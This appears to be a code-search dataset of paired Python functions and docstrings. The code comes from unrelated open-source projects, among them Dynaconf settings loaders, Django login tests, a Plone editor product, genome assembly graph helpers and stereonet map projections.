1	class DynaconfConfig(Config): def get(self, key, default=None): return self._settings.get(key, Config.get(self, key, default)) def __init__(self, _settings, *args, **kwargs): super(DynaconfConfig, self).__init__(*args, **kwargs) Config.update(self, _settings.store) self._settings = _settings def __getitem__(self, key): return self.get(key) def __getattr__(self, name): try: return getattr(self._settings, name) except AttributeError: return self[name] def __call__(self, name, *args, **kwargs): return self.get(name, *args, **kwargs)	Settings load order in Dynaconf: - Load all defaults and Flask defaults - Load all passed variables when applying FlaskDynaconf - Update with data in settings files - Update with data in environmente vars `ENV_FOR_DYNACONF_`
1	class DynaconfDict(dict): def __init__(self, *args, **kwargs): _no_project_root = kwargs.pop('_no_project_root', None) if not _no_project_root: self.PROJECT_ROOT_FOR_DYNACONF = '.' super(DynaconfDict, self).__init__(*args, **kwargs) def logger(self): return raw_logger() def set(self, key, value, *args, **kwargs): self[key] = value def get_environ(key, default=None): return os.environ.get(key, default) def raw_logger():	A dict representing en empty Dynaconf object useful to run loaders in to a dict for testing
1	def init_app(self, app, **kwargs): self.kwargs.update(kwargs) self.settings = self.dynaconf_instance or LazySettings(**self.kwargs) app.config = self.make_config(app) app.dynaconf = self.settings	kwargs holds initial dynaconf configuration
1	def _setup(self): raise NotImplementedError( 'subclasses of LazyObject must provide a _setup() method' )	Must be implemented by subclasses to initialize the wrapped object.
1	def __init__(self, **kwargs): compat_kwargs(kwargs) self._kwargs = kwargs super(LazySettings, self).__init__()	handle initialization for the customization cases :param kwargs: values that overrides default_settings
1	def __getattr__(self, name): if self._wrapped is empty: self._setup() if name in self._wrapped._deleted: raise AttributeError( "Attribute %s was deleted, " "or belongs to different env" % name ) if ( name.isupper() and (self._wrapped._fresh or name in self._wrapped.FRESH_VARS_FOR_DYNACONF) and name not in dir(default_settings) ): return self._wrapped.get_fresh(name) return getattr(self._wrapped, name)	Allow getting keys from self.store using dot notation
1	def __call__(self, *args, **kwargs): return self.get(*args, **kwargs)	Allow direct call of settings('val') in place of settings.get('val')
1	def configure(self, settings_module=None, **kwargs): compat_kwargs(kwargs) kwargs.update(self._kwargs) self._wrapped = Settings(settings_module=settings_module, **kwargs)	Allows user to reconfigure settings object passing a new settings module or separated kwargs :param settings_module: defines the setttings file :param kwargs: override default settings
1	def __init__(self, settings_module=None, **kwargs): self._logger = None self._fresh = False self._loaded_envs = [] self._deleted = set() self._store = {} self._loaded_by_loaders = {} self._loaders = [] self._defaults = {} self.environ = os.environ self.SETTINGS_MODULE = None self._not_installed_warnings = [] self._memoized = None compat_kwargs(kwargs) if settings_module: self.set('SETTINGS_MODULE_FOR_DYNACONF', settings_module) for key, value in kwargs.items(): self.set(key, value) self._defaults = kwargs self.execute_loaders()	Execute loaders and custom initialization :param settings_module: defines the setttings file :param kwargs: override default settings
1	def __call__(self, *args, **kwargs): return self.get(*args, **kwargs)	Allow direct call of `settings('val')` in place of `settings.get('val')`
1	def __delattr__(self, name): self._deleted.add(name) if hasattr(self, name): super(Settings, self).__delattr__(name)	stores reference in `_deleted` for proper error management
1	def __getitem__(self, item): value = self.get(item) if value is None: raise KeyError('{0} does not exists'.format(item)) return value	Allow getting variables as dict keys `settings['KEY']`
1	def exists(self, key, fresh=False): key = key.upper() if key in self._deleted: return False return self.get(key, fresh=fresh, default=missing) is not missing	Check if key exists :param key: the name of setting variable :param fresh: if key should be taken from source direclty :return: Boolean
1	def get_fresh(self, key, default=None, cast=None): return self.get(key, default=default, cast=cast, fresh=True)	This is a shortcut to `get(key, fresh=True)`. always reload from loaders store before getting the var. :param key: The name of the setting value, will always be upper case :param default: In case of not found it will be returned :param cast: Should cast in to @int, @float, @bool or @json ? :return: The value if found, default or None
1	def get_environ(self, key, default=None, cast=None): key = key.upper() data = self.environ.get(key, default) if data: if cast in converters: data = converters.get(cast)(data) if cast is True: data = parse_conf_data(data, tomlfy=True) return data	Get value from environment variable using os.environ.get :param key: The name of the setting value, will always be upper case :param default: In case of not found it will be returned :param cast: Should cast in to @int, @float, @bool or @json ? or cast must be true to use cast inference :return: The value if found, default or None
1	def write(obj, data=None, **kwargs): if obj.REDIS_ENABLED_FOR_DYNACONF is False: raise RuntimeError( 'Redis is not configured \n' 'export REDIS_ENABLED_FOR_DYNACONF=true\n' 'and configure the REDIS_FOR_DYNACONF_* variables' ) client = StrictRedis(**obj.REDIS_FOR_DYNACONF) holder = obj.get('GLOBAL_ENV_FOR_DYNACONF') data = data or {} data.update(kwargs) if not data: raise AttributeError('Data must be provided') redis_data = { key.upper(): unparse_conf_data(value) for key, value in data.items() } client.hmset(holder.upper(), redis_data) load(obj)	Write a value in to loader source :param obj: settings object :param data: vars to be stored :param kwargs: vars to be stored :return:
1	def delete(obj, key=None): client = StrictRedis(**obj.REDIS_FOR_DYNACONF) holder = obj.get('GLOBAL_ENV_FOR_DYNACONF') if key: client.hdel(holder.upper(), key.upper()) obj.unset(key) else: keys = client.hkeys(holder.upper()) client.delete(holder.upper()) obj.unset_all(keys)	Delete a single key if specified, or all env if key is none :param obj: settings object :param key: key to delete from store location :return: None
1	def load(obj, env=None, silent=True, key=None, filename=None): if toml is None: BaseLoader.warn_not_installed(obj, 'toml') return loader = BaseLoader( obj=obj, env=env, identifier='toml', extensions=TOML_EXTENSIONS, file_reader=toml.load, string_reader=toml.loads ) loader.load(filename=filename, key=key, silent=silent)	Reads and loads in to "obj" a single key or all keys from source file. :param obj: the settings instance :param env: settings current env default='development' :param silent: if errors should raise :param key: if defined load a single key, else load all in env :param filename: Optional custom filename to load :return: None
1	def write(settings_path, settings_data, merge=True): settings_path = Path(settings_path) if settings_path.exists() and merge: object_merge( toml.load( io.open( str(settings_path), encoding=default_settings.ENCODING_FOR_DYNACONF ) ), settings_data ) toml.dump( settings_data, io.open( str(settings_path), 'w', encoding=default_settings.ENCODING_FOR_DYNACONF ) )	Write data to a settings file. :param settings_path: the filepath :param settings_data: a dictionary with data :param merge: boolean if existing file should be merged with new data
1	def _get_env_list(obj, env): env_list = [obj.get('DEFAULT_ENV_FOR_DYNACONF')] global_env = obj.get('GLOBAL_ENV_FOR_DYNACONF') if global_env not in env_list: env_list.append(global_env) if obj.current_env and obj.current_env not in env_list: env_list.append(obj.current_env) if env and env not in env_list: env_list.append(env) env_list.append('GLOBAL') return [env.lower() for env in env_list]	Creates the list of environments to read :param obj: the settings instance :param env: settings env default='DYNACONF' :return: a list of working environments
1	def load(obj, env=None, silent=None, key=None): client = get_client(obj) env_list = _get_env_list(obj, env) for env in env_list: path = '/'.join([obj.VAULT_PATH_FOR_DYNACONF, env]).replace('//', '/') data = client.read(path) if data: data = data.get('data', {}).get('data', {}) try: if data and key: value = parse_conf_data(data.get(key), tomlfy=True) if value: obj.logger.debug( "vault_loader: loading by key: %s:%s (%s:%s)", key, '****', IDENTIFIER, path ) obj.set(key, value) elif data: obj.logger.debug( "vault_loader: loading: %s (%s:%s)", list(data.keys()), IDENTIFIER, path ) obj.update(data, loader_identifier=IDENTIFIER, tomlfy=True) except Exception as e: if silent: if hasattr(obj, 'logger'): obj.logger.error(str(e)) return False raise	Reads and loads in to "settings" a single key or all keys from vault :param obj: the settings instance :param env: settings env default='DYNACONF' :param silent: if errors should raise :param key: if defined load a single key, else load all in env :return: None
1	def write(obj, data=None, **kwargs): if obj.VAULT_ENABLED_FOR_DYNACONF is False: raise RuntimeError( 'Vault is not configured \n' 'export VAULT_ENABLED_FOR_DYNACONF=true\n' 'and configure the VAULT_FOR_DYNACONF_* variables' ) data = data or {} data.update(kwargs) if not data: raise AttributeError('Data must be provided') client = get_client(obj) path = '/'.join([obj.VAULT_PATH_FOR_DYNACONF, obj.current_env.lower()]).replace('//', '/') client.write(path, data=data) load(obj)	Write a value in to loader source :param obj: settings object :param data: vars to be stored :param kwargs: vars to be stored :return:
1	def load(obj, env=None, silent=True, key=None, filename=None): if yaml is None: BaseLoader.warn_not_installed(obj, 'yaml') return loader = BaseLoader( obj=obj, env=env, identifier='yaml', extensions=YAML_EXTENSIONS, file_reader=yaml.load, string_reader=yaml.load ) loader.load(filename=filename, key=key, silent=silent)	Reads and loads in to "obj" a single key or all keys from source file. :param obj: the settings instance :param env: settings current env default='development' :param silent: if errors should raise :param key: if defined load a single key, else load all in env :param filename: Optional custom filename to load :return: None
1	def write(settings_path, settings_data, merge=True): settings_path = Path(settings_path) if settings_path.exists() and merge: object_merge( yaml.load( io.open( str(settings_path), encoding=default_settings.ENCODING_FOR_DYNACONF ) ), settings_data ) yaml.dump( settings_data, io.open( str(settings_path), 'w', encoding=default_settings.ENCODING_FOR_DYNACONF ) )	Write data to a settings file. :param settings_path: the filepath :param settings_data: a dictionary with data :param merge: boolean if existing file should be merged with new data
1	def object_merge(old, new): if isinstance(old, list) and isinstance(new, list): if old == new: return for item in old[::-1]: new.insert(0, item) if isinstance(old, dict) and isinstance(new, dict): for key, value in old.items(): if key not in new: new[key] = value else: object_merge(value, new[key])	Recursively merge two data structures
1	def _walk_to_root(path): if not os.path.exists(path): raise IOError('Starting path not found') if os.path.isfile(path): path = os.path.dirname(path) last_dir = None current_dir = os.path.abspath(path) while last_dir != current_dir: yield current_dir parent_dir = os.path.abspath(os.path.join(current_dir, os.path.pardir)) last_dir, current_dir = current_dir, parent_dir	Yield directories starting from the given directory up to the root
1	usecwd=True, project_root=None): if project_root not in ['.', None]: path = project_root else: if usecwd or '__file__' not in globals(): path = os.getcwd() else: frame_filename = sys._getframe().f_back.f_code.co_filename path = os.path.dirname(os.path.abspath(frame_filename)) for dirname in _walk_to_root(path): check_path = os.path.join(dirname, filename) if os.path.exists(check_path): return check_path if raise_error_if_not_found: raise IOError('File not found') return ''	Search in increasingly higher folders for the given file Returns path to the file if found, or an empty string otherwise
1	def __new__(cls, fget=None, fset=None, fdel=None, doc=None): if fget is not None: @wraps(fget) def fget(instance, instance_type=None, name=fget.__name__): return getattr(instance, name)() if fset is not None: def fset(instance, value, name=fset.__name__): return getattr(instance, name)(value) if fdel is not None: def fdel(instance, name=fdel.__name__): return getattr(instance, name)() return property(fget, fset, fdel, doc)	A property that works with subclasses by wrapping the decorated functions of the base class.
1	def __init__(self, spatial_radius=None, range_radius=None, min_density=None, speedup_level=SPEEDUP_HIGH): self._spatial_radius = None self._range_radius = None self._min_density = None self._speedup_level = None if spatial_radius is not None: self.spatial_radius = spatial_radius if range_radius is not None: self.range_radius = range_radius if min_density is not None: self.min_density = min_density self.speedup_level = speedup_level	Segmenter init function. See function segment for keywords description.
1	def vertex_handle(core): coord = np.array((1,1,1),dtype='float64') vert = core.create_vertices(coord) vert_copy = np.array((vert[0],),dtype='uint64') return vert_copy	Convenience function for getting an arbitrary vertex element handle.
1	class Lesson(Base): __tablename__ = 'lessons' id = Column(Integer, primary_key=True, unique=True) title = Column(String) access_level = Column( Integer, nullable=False, default=7 ) contest_id = Column( Integer, ForeignKey( Contest.id, onupdate="CASCADE", ondelete="CASCADE" ), nullable=False, index=True ) contest = relationship( Contest, backref=backref( 'lessons', cascade="all, delete-orphan", passive_deletes=True ) ) class LessonTask(Base):	Class to store a specific lesson.
1	class Material(Base): __tablename__ = 'materials' id = Column(Integer, primary_key=True, unique=True) title = Column(Unicode) access_level = Column( Integer, nullable=False, default=7 ) contest_id = Column( Integer, ForeignKey( Contest.id, onupdate="CASCADE", ondelete="CASCADE" ), nullable=False, index=True ) contest = relationship( Contest, backref=backref( 'materials', cascade="all, delete-orphan", passive_deletes=True ) ) text = Column(Unicode, nullable=False, default='')	Class to store material for the users.
1	class PracticeWebServer(Service): def __init__(self, args): Service.__init__(self, shard=args.shard) self.address = config.get("core", "listen_address") self.port = int(config.get("core", "listen_port")) + args.shard self.file_cacher = FileCacher(self) self.evaluation_service = self.connect_to( ServiceCoord('EvaluationService', 0)) self.wsgi_app = APIHandler(self) def run(self): server = Server((self.address, self.port), self.wsgi_app) gevent.spawn(server.serve_forever) Service.run(self) def main():	Service that runs the web server for practice.
1	class QuestionFile(Base): __tablename__ = 'questionfiles' id = Column(Integer, primary_key=True) question_id = Column( Integer, ForeignKey(TestQuestion.id, onupdate="CASCADE", ondelete="CASCADE"), nullable=False, index=True) question = relationship( TestQuestion, backref=backref('files', cascade="all, delete-orphan", passive_deletes=True)) filename = Column(Unicode, nullable=False) digest = Column(String, nullable=False) class TestScore(Base):	Class to store a question's files
1	class TestQuestion(Base): __tablename__ = 'testquestions' id = Column(Integer, primary_key=True) test_id = Column( Integer, ForeignKey(Test.id, onupdate="CASCADE", ondelete="CASCADE"), nullable=False, index=True) test = relationship( Test, backref=backref( 'questions', order_by=[id], cascade="all, delete-orphan", passive_deletes=True)) text = Column(Unicode, nullable=False) answers = Column(Unicode, nullable=False) type = Column(Unicode, nullable=False) score = Column(Integer, nullable=False) wrong_score = Column(Integer, nullable=False) def __init__(self): pass class QuestionFile(Base):	Class to store a single question of a test.
1	def run_migrations_offline(): url = config.get_main_option("sqlalchemy.url") context.configure( url=url, target_metadata=target_metadata, literal_binds=True) with context.begin_transaction(): context.run_migrations()	Run migrations in 'offline' mode. This configures the context with just a URL and not an Engine, though an Engine is acceptable here as well. By skipping the Engine creation we don't even need a DBAPI to be available. Calls to context.execute() here emit the given string to the script output.
1	def run_migrations_online(): connectable = engine_from_config( config.get_section(config.config_ini_section), prefix='sqlalchemy.', poolclass=pool.NullPool) with connectable.connect() as connection: context.configure( connection=connection, target_metadata=target_metadata ) with context.begin_transaction(): context.run_migrations()	Run migrations in 'online' mode. In this scenario we need to create an Engine and associate a connection with the context.
1	def __repr__(self): settings = {} settings['plate_layout'] = self.layout settings['switch_type'] = self.switch_type settings['stabilizer_type'] = self.stab_type settings['case_type_and_holes'] = self.case settings['width_padding'] = self.x_pad settings['height_padding'] = self.y_pad settings['plate_corners'] = self.fillet settings['kerf'] = self.kerf return json.dumps(settings, sort_keys=True, indent=4, separators=(',', ': '))	Print out all Plate object configuration settings.
1	def __repr__(self): settings = {} settings['plate_layout'] = self.layout settings['switch_type'] = self.switch_type settings['stabilizer_type'] = self.stab_type settings['case_type_and_holes'] = self.case settings['width_padding'] = self.x_pad settings['height_padding'] = self.y_pad settings['plate_corners'] = self.fillet settings['kerf'] = self.kerf return json.dumps(settings, sort_keys=True, indent=4, separators=(',', ': '))	Print out all Plate object configuration settings.
1	def to_dict(self, copy=False): new_dict = {} for attr, value in self: if copy: value = deepcopy(value) new_dict[attr] = value return new_dict	Convert the struct to a dictionary. If `copy == True`, returns a deep copy of the values.
1	class ApplicationUpdateView(LoginRequiredMixin, UpdateView): form_class = RegistrationForm context_object_name = 'application' template_name = "oauth2_provider/application_form.html" def get_queryset(self): return get_oauth2_application_model().objects.filter(user=self.request.user) class CustomAuthorizationView(AuthorizationView):	View used to update an application owned by the request.user
1	def test_user_already_logged_in_get(self): self._user_login() response = self.client.get(self.login_url) self.assertRedirects(response, self.login_redirect_url)	Tests the redirect on opening login page when user is already logged in. Request must be redirected to settings.LOGIN_REDIRECT_URL when get query 'next' is not present
1	def test_user_already_logged_in_get_with_next(self): self._user_login() response = self.client.get('%s?next=%s' % (self.login_url, self.next_)) self.assertRedirects(response, self.next_)	Tests the redirect on opening login page when user is already logged in. Request must be redirected to get query param 'next'
1	def test_user_not_logged_in_get(self): response = self.client.get(self.login_url) self.assertTemplateUsed(response, self.template_name) self.assertEqual(response.status_code, 200)	Test in case user is not logged in. Should return 200 status for 'account:login' page
1	def test_user_not_logged_in_get_with_next(self): response = self.client.get('%s?next=%s' % (self.login_url, self.next_)) self.assertEqual(response.status_code, 200) self.assertTemplateUsed(response, self.template_name)	Should not redirect in case 'next' is present in query param and user is not logged in
1	def test_user_not_logged_in_without_next(self): response = self.client.get(self.login_url) self.assertEqual(response.status_code, 200) six.assertRegex(self, response.content.decode('utf-8'), r'name=[\'"]next[\'"].*?value=[\'"]{2}')	Test when ?next= is not present in URL. Rendered form should have hidden input with name next and value ''
1	def test_post_request_correct_credentials_with_next(self): response = self.client.post(self.login_url, {'username': 'test_user', 'password': 'test123', 'next': '/user/'}) self.assertRedirects(response, '/user/')	Posting data with next in action URL. Should be redirect to next
1	def test_post_request_correct_credentials_with_empty_next(self): response = self.client.post(self.login_url, {'username': 'test_user', 'password': 'test123', 'next': ''}) self.assertRedirects(response, self.login_redirect_url)	Posting data with empty next in action URL. Should be redirect to login_redirect_url
1	def test_user_logged_in(self): self.client.login(username='test_user', password='test123') response = self.client.get(self.logout_url) self.assertRedirects(response, self.root_url)	Logout should redirect to login page
1	def test_post(self): response = self.client.post(self.logout_url) self.assertEqual(response.status_code, 405)	Assert that POST method is not allowed for logout. Response code should be 405
1	def convert(self, data, idata, filename=None, **kwargs): context = kwargs.get('context', None) if context: at_tool = context.archetype_tool if context and at_tool: def replaceImage(match): tag = match.group(1) or match.group(2) attrs = ATTR_PATTERN.match(tag) src = attrs.group('src') klass = attrs.group('class') width = attrs.group('width') if src: d = attrs.groupdict() target = at_tool.reference_catalog.lookupObject(src) if target: d['caption'] = newline_to_br(target.Description()) d['tag'] = CLASS_PATTERN.sub('', d['tag']) if not width: d['width'] = target.getWidth() return IMAGE_TEMPLATE % d return match.group(0) html = IMAGE_PATTERN.sub(replaceImage, data) def replaceUids(match): tag = match.group('tag') uid = match.group('uid') target = at_tool.reference_catalog.lookupObject(uid) if target: return tag + target.absolute_url() return match.group(0) html = UID_PATTERN.sub(replaceUids, html) idata.setData(html) return idata return data	convert the data, store the result in idata and return that optional argument filename may give the original file name of received data additional arguments given to engine's convert, convertTo or __call__ are passed back to the transform The object on which the translation was invoked is available as context (default: None)
1	def getTableClassnames(self): try: return self.table_classnames except AttributeError: return ('plain', 'listing', 'vertical listing', 'listing nosort|unsorted listing')	Return a list of classnames supported in tables
1	def getParagraphStyles(self): try: return self.paragraph_styles except AttributeError: return _default_paragraph_styles	Return a list of classnames supported by paragraphs
1	def scanIds(self): return scanner.scanIds()	Finds the relevant source files and the doller/Id/dollar strings they contain
1	def docs(self): docpath = os.path.join(Globals.package_home(kupu_globals), 'doc') f = open(os.path.join(docpath, 'PLONE2.txt'), 'r') _docs = f.read() return _docs	Returns Kupu docs formatted as HTML
1	def zmi_get_libraries(self): #return () def text(value): return getattr(value, 'text', value) return [dict([(key, text(value)) for key, value in lib.items()]) for lib in self._libraries]	Return the libraries sequence for the ZMI view
1	def zmi_add_library(self, id, title, uri, src, icon, REQUEST): self.addLibrary(id, title, uri, src, icon) REQUEST.RESPONSE.redirect(self.absolute_url() + '/zmi_libraries')	Add a library through the ZMI
1	def check(self, text): result = {} for line in text.split('\n'): line = line.strip() if line: self.write_line(line) while 1: resline = self.read_line() if not resline.strip(): break if resline.strip() != '*': match = self.reg_unknown.match(resline) have_replacement = True if not match: match = self.reg_unknown_no_replacement.match(resline) have_replacement = False assert match, 'Unknown formatted line: %s' % resline word = match.group(1) if result.has_key(word): continue replacements = [] if have_replacement: replacements = match.group(2).split(', ') result[word] = replacements return result	checks a line of text returns None if spelling was okay, and an HTML string with words that weren't recognized marked (with a span class="wrong_spelling")
1	def strip(data): data = one_line_comment.sub('', data) data = trailing_comment.sub('', data) data = multi_line_comment.sub('', data) data = whitespace_after_separator.sub(';', data) data = whitespace_after_opening_bracket.sub('{', data) data = starting_whitespace.sub('', data) return data.strip()	Processes the data, removing comments and unecessary whitespace.
1	def register_layer(self, relpath, name, out): print >>out, "register skin layers" skinstool = getToolByName(self, 'portal_skins') if name not in skinstool.objectIds(): kupu_plone_skin_dir = minimalpath(os.path.join(kupu_package_dir, relpath)) createDirectoryView(skinstool, kupu_plone_skin_dir, name) print >>out, "The layer '%s' was added to the skins tool" % name for skinName in skinstool.getSkinSelections(): path = skinstool.getSkinPath(skinName) path = [i.strip() for i in path.split(',')] try: if name not in path: path.insert(path.index('custom')+1, name) except ValueError: if name not in path: path.append(name) path = ','.join(path) skinstool.addSkinSelection(skinName, path)	Register a file system directory as skin layer
1	def uninstall_resources(self, out): try: from Products.ResourceRegistries.config import CSSTOOLNAME, JSTOOLNAME except ImportError: return data = _read_resources() csstool = getToolByName(self, CSSTOOLNAME) jstool = getToolByName(self, JSTOOLNAME) for id in css_files(data): csstool.manage_removeStylesheet(id=id) for id in js_files(data): jstool.manage_removeScript(id=id) print >>out, "Resource files removed"	Remove the js and css files from the resource registries
1	def install_libraries(self, out): addTool = self.manage_addProduct['kupu'].manage_addTool try: addTool('Kupu Library Tool') print >>out, "Added the Kupu Library Tool to the plone Site" except BadRequest: print >>out, "Kupu library Tool already added" except: e=sys.exc_info() if e[0] != 'Bad Request': raise print >>out, "Kupu library Tool already added"	Install everything necessary to support Kupu Libraries
1	def install_customisation(self, out): self.changeSkin(None) scriptname = '%s-customisation-policy' % PROJECTNAME.lower() cpscript = getattr(self, scriptname, None) if cpscript: cpscript = cpscript.__of__(self) if cpscript: print >>out,"Customising %s" % PROJECTNAME print >>out,cpscript() else: print >>out,"No customisation policy"	Default settings may be stored in a customisation policy script so that the entire setup may be 'productised'
1	def createKupuEditor(parent, filepath, id=None): info = _dirreg.getDirectoryInfo(filepath) if info is None: raise ValueError('Not a registered directory: %s' % filepath) if not id: id = path.split(filepath)[-1] else: id = str(id) ob = KupuEditor(id, filepath) parent._setObject(id, ob)	Adds either a DirectoryView or a derivative object.
1	id=None, REQUEST=None): createKupuEditor(self, filepath, id) if REQUEST is not None: return self.manage_main(self, REQUEST)	Adds either an kupu editor object
1	def dispatch_request(self): ctx = {'form' : SearchForm()} except_field = None query, fields = None, None wildcards = True form = SearchForm() if self.debug: print('form:') pprint(form.data) if form.validate_on_submit(): add_wildcards = form.add_wildcards.data except_fields = re.split('\W+', form.except_field.data, flags=re.UNICODE) fields = re.split('\W+', form.fields.data, flags=re.UNICODE) models = re.split('\W+', form.models.data, flags=re.UNICODE) query = form.query.data something = form.something.data results = self._pw.search( query , add_wildcards=add_wildcards , something=something , include_entity=True , fields=fields , models=models , except_fields=except_fields , use_dict=False ) if self.debug: print('form = ') pprint({ 'query': query , 'add_wildcards': add_wildcards , 'something': something , 'include_entity': True , 'fields': fields , 'models': models , 'except_fields': except_fields }) print("results = ") pprint(results) return render_template( 'ponywhoosh/results.html' , entidades=list(self._pw._entities.keys()) , action_url_form=self.action_url_form , form=form , results=results , n=results['cant_results'] , labels=results['results'].keys() ) return render_template( 'ponywhoosh/index.html' , form=form , action_url_form=self.action_url_form , query=query )	This form is plugeable. That means that all what you need to do is to install the package and run the url :: /ponywhoosh/ (You may change it in the config) and get the results. Returns: Results: The results are sent to the template using bootstrap. They are renderized using whether a grid or a table, depending on what models did you register. By default the first field registered is considered the one that will be contained in the tittle of each searh result.
1	def get_version(package): init_py = open(os.path.join(package, '__init__.py')).read() return re.search("^__version__ = ['\"]([^'\"]+)['\"]", init_py, re.MULTILINE).group(1)	Return package version as listed in `__version__` in `init.py`.
1	def get_packages(package): return [dirpath for dirpath, dirnames, filenames in os.walk(package) if os.path.exists(os.path.join(dirpath, '__init__.py'))]	Return root package and all sub-packages.
1	def get_package_data(package): walk = [(dirpath.replace(package + os.sep, '', 1), filenames) for dirpath, dirnames, filenames in os.walk(package) if not os.path.exists(os.path.join(dirpath, '__init__.py'))] filepaths = [] for base, filenames in walk: filepaths.extend([os.path.join(base, filename) for filename in filenames]) return {package: filepaths}	Return all files under the root package, that are not in a package themselves.
1	def update_node_coverage(G, node, new_cov): if node not in G.nodes(): # nothing to be done, perhaps already removed return if new_cov == 0: G.remove_node(node) if rc_node(node) in G.nodes(): G.remove_node(rc_node(node)) else: G.add_node(node, cov=new_cov) G.add_node(rc_node(node), cov=new_cov)	changes coverage value stored in 'cov' field on both F and R version of a node if new_cov is 0, both node versions are removed
1	def get_seq_from_path(path, seqs, max_k_val=55, cycle=True): start = seqs[path[0]] if len(path)==1: if cycle: return start[max_k_val:] else: return start else: seq = '' for p in path: seq += seqs[p][max_k_val:] if cycle: return seq else: return start[:max_k_val] + seq	retrieves sequence from a path; instead of specifying cycles by having the first and last node be equal, the user must decide if a cycle is the intent to avoid redundant k-mers at the ends
1	def get_long_self_loops(G, min_length, seqs): self_loops = set([]) to_remove = [] for nd in G.nodes_with_selfloops(): nd_path = (nd,) if len(get_seq_from_path(nd_path, seqs)) >= min_length \ and (rc_node(nd),) not in self_loops: self_loops.add(nd_path) to_remove.append(nd) for nd in to_remove: update_node_coverage(G, nd, 0) return self_loops	returns set of self loop nodes paths that are longer than min length; removes those and short self loops from G
1	def get_unoriented_sorted_str(path): all_rc_path = [] for p in path: if p[-1] != "'": p = p+"'" all_rc_path.append(p) return "".join(sorted(all_rc_path))	creates unique, orientation-oblivious string representation of path, used to make sure node covered whenever rc of node is; lets us avoid issue of rc of node having different weight than node
1	def get_non_repeat_nodes(G, path): sing_nodes = [] for nd in path: if G.out_degree(nd)==1 and G.in_degree(nd)==1: sing_nodes.append(nd) return sing_nodes	returns a list of all non-repeat (in degree and out-degree == 1) nodes in a path; if there are no such nodes, returns an empty list NB: G input should be whole graph, not specific SCC, to avoid disregarding isolated nodes
1	class BaseForwardTransform(BaseStereonetTransform): _inverse_type = 'BaseInvertedTransform' def transform_non_affine(self, ll): longitude = ll[:, 0:1] latitude = ll[:, 1:2] clong = self._center_longitude clat = self._center_latitude cos_lat = np.cos(latitude) sin_lat = np.sin(latitude) diff_long = longitude - clong cos_diff_long = np.cos(diff_long) inner_k = (1.0 + np.sin(clat)*sin_lat + np.cos(clat)*cos_lat*cos_diff_long) inner_k = np.where(inner_k == 0.0, 1e-15, inner_k) k = self._calculate_k(inner_k) x = k*cos_lat*np.sin(diff_long) y = k*(np.cos(clat)*sin_lat - np.sin(clat)*cos_lat*cos_diff_long) return np.concatenate((x, y), 1) transform_non_affine.__doc__ = \ BaseStereonetTransform.transform_non_affine.__doc__ def _calculate_k(self, inner_k): pass class BaseInvertedTransform(BaseStereonetTransform):	A base class for both Lambert and Stereographic forward transforms.
1	class BaseInvertedTransform(BaseStereonetTransform): _inverse_type = 'BaseForwardTransform' def transform_non_affine(self, xy): x = xy[:, 0:1] y = xy[:, 1:2] clong = self._center_longitude clat = self._center_latitude p = np.sqrt(x*x + y*y) p = np.where(p == 0.0, 1e-9, p) c = self._calculate_c(p) sin_c = np.sin(c) cos_c = np.cos(c) lat = np.arcsin(cos_c*np.sin(clat) + ((y*sin_c*np.cos(clat)) / p)) lon = clong + np.arctan( (x*sin_c) / (p*np.cos(clat)*cos_c - y*np.sin(clat)*sin_c)) return np.concatenate((lon, lat), 1) transform_non_affine.__doc__ = \ BaseStereonetTransform.transform_non_affine.__doc__ def _calculate_c(self, p): pass class LambertTransform(BaseForwardTransform):	A base class for both Lambert and Stereographic inverse transforms.
1	def __init__(self, center_longitude, center_latitude, resolution): Transform.__init__(self) self._resolution = resolution self._center_longitude = center_longitude self._center_latitude = center_latitude	Create a new transform. Resolution is the number of steps to interpolate between each input line segment to approximate its path in projected space.
1	def inverted(self): inverse_type = globals()[self._inverse_type] return inverse_type(self._center_longitude, self._center_latitude, self._resolution)	Return the inverse of the transform.
1	class EqualAreaAxes(StereonetAxes): name = 'equal_area_stereonet' EqualAngleAxesSubplot = subplot_class_factory(EqualAngleAxes)	An axes representing a lower-hemisphere "Schmitt" (a.k.a. equal area) projection.
1	class InvertedLambertTransform(BaseInvertedTransform): _inverse_type = 'LambertTransform' def _calculate_c(self, p): return 2.0 * np.arcsin(0.5 * p) class StereographicTransform(BaseForwardTransform):	The Lambert (a.k.a. "equal area") inverse transform.
1	class InvertedStereographicTransform(BaseInvertedTransform): _inverse_type = 'StereographicTransform' def _calculate_c(self, p): return 2.0 * np.arctan(0.5 * p)	The Stereographic (a.k.a. "equal angle") inverse transform.
1	class LambertTransform(BaseForwardTransform): _inverse_type = 'InvertedLambertTransform' def _calculate_k(self, inner_k): return np.sqrt(2.0 / inner_k) class InvertedLambertTransform(BaseInvertedTransform):	The Lambert (a.k.a. "equal area") forward transform.
1	class StereographicTransform(BaseForwardTransform): _inverse_type = 'InvertedStereographicTransform' def _calculate_k(self, inner_k): return 2 / inner_k class InvertedStereographicTransform(BaseInvertedTransform):	The Stereographic (a.k.a. "equal angle") forward transform.
1	def __init__(self, *args, **kwargs): self.horizon = np.radians(90) self._rotation = -np.radians(kwargs.pop('rotation', 0)) y0 = kwargs.get('center_latitude', self._default_center_lat) x0 = kwargs.get('center_longitude', self._default_center_lon) kwargs['center_latitude'] = y0 kwargs['center_longitude'] = x0 self._overlay_axes = None LambertAxes.__init__(self, *args, **kwargs)	Initialization is identical to a normal Axes object except for the following kwarg: Parameters ----------- rotation : number The rotation of the stereonet in degrees clockwise from North. center_latitude : number The center latitude of the stereonet in degrees. center_longitude : number The center longitude of the stereonet in degrees. All additional args and kwargs are identical to Axes.__init__
1	def set_longitude_grid(self, degrees): number = (360.0 / degrees) + 1 locs = np.linspace(-np.pi, np.pi, number, True)[1:] locs[-1] -= 0.01 self.xaxis.set_major_locator(FixedLocator(locs)) self._logitude_degrees = degrees self.xaxis.set_major_formatter(self.ThetaFormatter(degrees))	Set the number of degrees between each longitude grid.
1	def set_position(self, pos, which='both'): self._polar.set_position(pos, which) if self._overlay_axes is not None: self._overlay_axes.set_position(pos, which) LambertAxes.set_position(self, pos, which)	Identical to Axes.set_position (This docstring is overwritten).
1	def set_rotation(self, rotation): self._rotation = np.radians(rotation) self._polar.set_theta_offset(self._rotation + np.pi / 2.0) self.transData.invalidate() self.transAxes.invalidate() self._set_lim_and_transforms()	Set the rotation of the stereonet in degrees clockwise from North.
1	def test_all_examples(): for filename in examples.example_files(): output_text, figures = examples.run(filename) if output_text: compare_text(filename, output_text) for fig in figures: compare_figure(filename, fig)	Run all python files in the example directory and compare their output with the previously saved output.
